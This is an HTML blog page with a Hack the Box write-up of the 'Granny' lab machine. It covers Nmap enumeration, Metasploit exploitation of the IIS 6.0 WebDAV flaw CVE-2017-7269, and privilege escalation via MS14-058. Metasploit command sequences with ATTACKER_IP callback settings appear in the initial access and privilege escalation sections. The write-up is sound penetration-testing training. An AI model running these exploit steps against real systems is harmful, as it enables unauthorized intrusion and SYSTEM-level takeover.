@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Granny - Hack the Box | Security With Ian</title>
+<meta name="keywords" content="">
+<meta name="description" content="Difficulty: Easy
+OS: Windows
+Date Completed: 2026-08-27
+Write-up Authored by: Ian Simons
+Challenge Created by: ch4p
+Core Competencies:
+
+Network Enumeration with Nmap
+Vulnerability Research
+Initial Access with Metasploit
+Vulnerability Scanning with Metasploit
+Privilege Escalation with Metasploit
+
+
+Overview
+This Box was recommended by the Hack the Box Academy Job Role Path &ldquo;Penetration Tester&rdquo; in the &ldquo;Getting Started&rdquo; Module. The purpose of completing this box is to build familiarity with Metasploit. As we will see it did just that.
+Note: Flags documented in Appendix B">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/granny---hack-the-box/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/granny---hack-the-box/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Security With Ian (Alt + H)">Security With Ian</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/security-toolkit/" title="Security Toolkit">
+                    <span>Security Toolkit</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Granny - Hack the Box
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-08-27 00:00:00 +0000 UTC'>August 27, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><p><strong>Difficulty:</strong> Easy</p>
+<p><strong>OS:</strong> Windows</p>
+<p><strong>Date Completed:</strong> 2026-08-27</p>
+<p><strong>Write-up Authored by:</strong> Ian Simons</p>
+<p><strong>Challenge Created by:</strong> ch4p</p>
+<p><strong>Core Competencies:</strong></p>
+<ul>
+<li>Network Enumeration with Nmap</li>
+<li>Vulnerability Research</li>
+<li>Initial Access with Metasploit</li>
+<li>Vulnerability Scanning with Metasploit</li>
+<li>Privilege Escalation with Metasploit</li>
+</ul>
+<hr>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>This Box was recommended by the Hack the Box Academy Job Role Path &ldquo;Penetration Tester&rdquo; in the &ldquo;Getting Started&rdquo; Module. The purpose of completing this box is to build familiarity with Metasploit. As we will see it did just that.
+Note: Flags documented in Appendix B</p>
+<hr>
+<h2 id="vulnerability-summary">Vulnerability summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
+<table>
+	<thead>
+			<tr>
+					<th>Vulnerability</th>
+					<th>CVE</th>
+					<th>CVSS Score</th>
+					<th>MITRE ATT&amp;CK Technique</th>
+					<th>ATT&amp;CK Tactic</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>IIS 6.0 WebDAV Buffer Overflow Vulnerability</td>
+					<td>CVE-2017-7269</td>
+					<td>9.8 (CVSS v3)</td>
+					<td>T1190 - Exploit Public-Facing Application</td>
+					<td>Initial Access</td>
+			</tr>
+			<tr>
+					<td>Microsoft Win32k Privilege Escalation Vulnerability</td>
+					<td>CVE-2014-4113</td>
+					<td>7.8 (CVSS v3)</td>
+					<td>T1068 - Exploitation for Privilege Escalation</td>
+					<td>Privilege Escalation</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="attack-path-summary">Attack Path Summary<a hidden class="anchor" aria-hidden="true" href="#attack-path-summary">#</a></h2>
+<ol>
+<li>Performed network reconnaissance with <strong>Nmap</strong>, and identified <strong>Microsoft IIS 6.0</strong> with the <strong>WebDAV</strong> extension enabled</li>
+<li>Researched known vulnerabilities for <strong>IIS 6.0/WebDAV</strong>, identified <strong>CVE-2017-7269</strong> as a potential attack vector</li>
+<li>Searched the <strong>Metasploit Framework</strong> for available modules and located an exploit targeting the vulnerability</li>
+<li>Leveraged the Metasploit module: <strong>exploit/windows/iis/iis_webdav_scstoragepathfromurl</strong> to gain Initial Access to system</li>
+<li>Migrated Meterpreter session to a more stable process</li>
+<li>Utilized Metasploit module: <strong>post/multi/recon/local_exploit_suggester</strong> to identify potential Privilege Escalation vulnerability</li>
+<li>Leveraged Metasploit module: <strong>exploit/windows/local/ms14_058_track_popup_menu</strong> to escalate privileges to <strong>NT Authority\System</strong></li>
+<li>Located and captured the user and root/system flags, completing the objectives of the engagement</li>
+</ol>
+<hr>
+<h2 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h2>
+<h3 id="port-discovery">Port Discovery<a hidden class="anchor" aria-hidden="true" href="#port-discovery">#</a></h3>
+<p>Nmap scan results</p>
+<pre tabindex="0"><code>┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@pwnbox7]─[~]
+└──╼ [★]$ sudo nmap -sC -sV -oN scan.txt -T4 10.129.60.246
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-27 12:52 EDT
+Nmap scan report for 10.129.60.246
+Host is up (0.014s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-webdav-scan: 
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Date: Thu, 27 Aug 2026 16:52:34 GMT
+|   WebDAV type: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|_  Server Type: Microsoft-IIS/6.0
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds
+</code></pre><h4 id="key-open-ports-and-services">Key Open Ports and Services<a hidden class="anchor" aria-hidden="true" href="#key-open-ports-and-services">#</a></h4>
+<p>A single exposed service was identified</p>
+<table>
+	<thead>
+			<tr>
+					<th>Port</th>
+					<th>Service</th>
+					<th>Version</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>80/TCP</td>
+					<td>HTTP</td>
+					<td>Microsoft IIS 6.0</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="service-enumeration">Service Enumeration<a hidden class="anchor" aria-hidden="true" href="#service-enumeration">#</a></h3>
+<p>Further enumeration confirmed Microsoft IIS 6.0 and identified WebDAV as enabled. Multiple WebDAV methods were exposed including: <strong>OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</strong></p>
+<h3 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h3>
+<p>Web application presented only an &ldquo;Under Construction&rdquo; page. No additional content was identified during initial enumeration</p>
+<h3 id="vulnerability-research">Vulnerability Research<a hidden class="anchor" aria-hidden="true" href="#vulnerability-research">#</a></h3>
+<p>The exposed attack surface was limited to IIS 6.0 and WebDAV functionality. Research identified CVE-2017-7269, a known remote code execution vulnerability affecting IIS 6.0 WebDAV deployments, as a potential method for exploitation.</p>
+<hr>
+<h2 id="initial-access">Initial Access<a hidden class="anchor" aria-hidden="true" href="#initial-access">#</a></h2>
+<h3 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h3>
+<ul>
+<li>Description: IIS 6.0 WebDAV Buffer Overflow Vulnerability</li>
+<li>CVE: CVE-2017-7269</li>
+<li>CVSS score: 9.8 (CVSS v3)</li>
+<li>MITRE ATT&amp;CK: Initial Access - T1190: Exploit Public-Facing Application</li>
+</ul>
+<p>Microsoft IIS 6.0 with WebDAV enabled is vulnerable to a buffer overflow attack  (CVE-2017-7269) allowing an unauthenticated attacker to achieve remote code execution through a specially crafted HTTP request.</p>
+<h4 id="exploitation-steps">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps">#</a></h4>
+<p>Based on the identified IIS 6.0 WebDAV service, the Metasploit module <strong>exploit/windows/iis/iis_webdav_scstoragepathfromurl</strong> was selected because it specifically targets CVE-2017-7269</p>
+<ol>
+<li>Launch Metasploit framework</li>
+<li>Select module <strong>exploit/windows/iis/iis_webdav_scstoragepathfromurl</strong> targeting CVE-2017-7269</li>
+<li>Configure target and callback parameters</li>
+<li>Execute the exploit and obtain a remote session</li>
+</ol>
+<h4 id="key-commands--payloads">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads">#</a></h4>
+<pre tabindex="0"><code>#launch Metasploit Framework console
+msfconsole
+
+#select appropriate exploit module
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+#set appropriate options for module
+set RHOST &lt;TARGET_IP&gt;
+set RPORT 80
+set LHOST &lt;ATTACKER_IP&gt;
+set LPORT 4444
+
+#run exploit
+run
+</code></pre><h4 id="proof-of-access">Proof of Access<a hidden class="anchor" aria-hidden="true" href="#proof-of-access">#</a></h4>
+<h5 id="screenshots">Screenshots<a hidden class="anchor" aria-hidden="true" href="#screenshots">#</a></h5>
+<p><img alt="img1" loading="lazy" src="/images/granny/GrannyInitialAccess.jpg"></p>
+<p>Figure 1: Proof of initial access. Successful exploitation of CVE-2017-7269 resulted in command execution on the target host. Session validated by confirming execution context, hostname, and operating system version.</p>
+<h5 id="session-validation-commands">Session Validation Commands<a hidden class="anchor" aria-hidden="true" href="#session-validation-commands">#</a></h5>
+<pre tabindex="0"><code>#Check user context
+whoami.exe
+
+#Verify target hostname
+hostname
+
+#Verify operating system version
+ ver
+</code></pre><hr>
+<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
+<h3 id="session-preparation">Session Preparation<a hidden class="anchor" aria-hidden="true" href="#session-preparation">#</a></h3>
+<p>The Initial Meterpreter session was migrated to a more stable process prior to privilege escalation. Process migration improved session reliability and ensured compatibility with subsequent local exploitation modules.</p>
+<h3 id="vulnerability-details-1">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details-1">#</a></h3>
+<ul>
+<li>Description: Microsoft Win32k Privilege Escalation Vulnerability</li>
+<li>CVE: CVE-2014-4113</li>
+<li>CVSS score: 7.8 (CVSS v3)</li>
+<li>MITRE ATT&amp;CK: Privilege Escalation - T1068: Exploitation for Privilege Escalation</li>
+</ul>
+<p>Microsoft Windows systems affected by CVE-2014-4113 are vulnerable to a Win32k privilege escalation flaw that can allow a local attacker to execute code with elevated privileges, potentially resulting in SYSTEM-level access.</p>
+<h4 id="exploitation-steps-1">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps-1">#</a></h4>
+<ol>
+<li>Migrate the Meterpreter session to a more stable process</li>
+<li>Move Meterpreter Session to background</li>
+<li>Select Module <strong>exploit/windows/local/ms14_058_track_popup_menu</strong></li>
+<li>Configure target session and callback parameters</li>
+<li>Execute Exploit and obtain NT AUTHORITY\SYSTEM privileges</li>
+</ol>
+<h4 id="key-commands--payloads-1">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads-1">#</a></h4>
+<pre tabindex="0"><code>#check current processes
+ps
+
+#Migrate process
+migrate &lt;TARGET_PROCESS&gt;
+
+#Background current session
+[CTRL+z]
+
+#Select appropriate module
+use exploit/windows/local/ms14_058_track_popup_menu
+
+#Configure module options
+set SESSION &lt;TARGET_SESSION&gt;
+set LHOST &lt;ATTACKER_IP&gt;
+set LPORT 4444
+
+#Run exploit
+run
+</code></pre><h4 id="proof-of-privilege-escalation">Proof of Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#proof-of-privilege-escalation">#</a></h4>
+<p><img alt="img2" loading="lazy" src="/images/granny/privEscwhomai.jpg">
+Figure 2: Proof of Privilege Escalation. Successful exploitation of CVE-2014-4113 resulted in execution within the NT Authority\System security context. Privileges validated by confirming execution context with the whoami command.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
+<p>The whole point of completing this Box was to build the fundamentals of using Metasploit. In that endeavor this Box was a complete success. There were absolutely some pain points along the way. However I now feel much more comfortable getting around the Metasploit Framework Console and utilizing a Meterpreter shell. Below are some key takeaways that hopefully can help others also attempting to solidify these fundamentals.</p>
+<ul>
+<li>Identifying a vulnerability before searching for an exploit is often more ifficient than searching for exploits first. Correlating discovered services with known CVEs can significantly narrow the research scope</li>
+<li>Initial access does not guarantee successful privilege escalation. Session preparation and stability can be the difference between success and failure</li>
+<li>Active exploitation can destabilize or crash services. Maintain thorough notes and documentation to ensure quick recovery if that happens</li>
+</ul>
+<hr>
+<h2 id="appendix">Appendix<a hidden class="anchor" aria-hidden="true" href="#appendix">#</a></h2>
+<h3 id="appendix-a">Appendix A<a hidden class="anchor" aria-hidden="true" href="#appendix-a">#</a></h3>
+<h4 id="tools-used">Tools Used<a hidden class="anchor" aria-hidden="true" href="#tools-used">#</a></h4>
+<table>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Nmap</td>
+					<td>Network Reconnaissance, Service Discovery, and version detection</td>
+			</tr>
+			<tr>
+					<td>SearchSploit</td>
+					<td>Vulnerability research and exploit identification</td>
+			</tr>
+			<tr>
+					<td>Metasploit Framework</td>
+					<td>Exploitation, session management, post-exploitation, and privilege escalation</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="appendix-b">Appendix B<a hidden class="anchor" aria-hidden="true" href="#appendix-b">#</a></h3>
+<h4 id="flags-found">Flags found<a hidden class="anchor" aria-hidden="true" href="#flags-found">#</a></h4>
+<p><img alt="img3" loading="lazy" src="/images/granny/ActionsOnObjective.jpg">
+User Flag:
+700c*************************7d1</p>
+<p>Root Flag:
+aa4**************************6e9</p>
+<h3 id="appendix-c">Appendix C<a hidden class="anchor" aria-hidden="true" href="#appendix-c">#</a></h3>
+<h4 id="supporting-evidence">Supporting Evidence<a hidden class="anchor" aria-hidden="true" href="#supporting-evidence">#</a></h4>
+<p>No additional supporting evidence was required beyond the artifacts included throughout this write-up</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Security With Ian</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
